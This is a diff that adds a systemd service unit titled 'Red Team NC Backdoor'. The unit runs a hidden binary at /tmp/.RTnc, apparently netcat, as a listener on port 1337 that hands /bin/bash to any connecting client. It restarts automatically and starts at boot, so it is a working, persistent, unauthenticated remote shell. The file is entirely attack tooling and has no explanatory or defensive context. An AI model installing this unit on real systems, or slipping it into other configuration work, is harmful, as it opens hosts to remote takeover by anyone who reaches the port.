@@ -1,0 +1,11 @@
+[Unit]
+Description=Red Team NC Backdoor
+
+[Service]
+Type=simple
+Restart=always
+ExecStart=/tmp/.RTnc -l -p 1337 -e /bin/bash
+
+[Install]
+WantedBy=multi-user.target
+
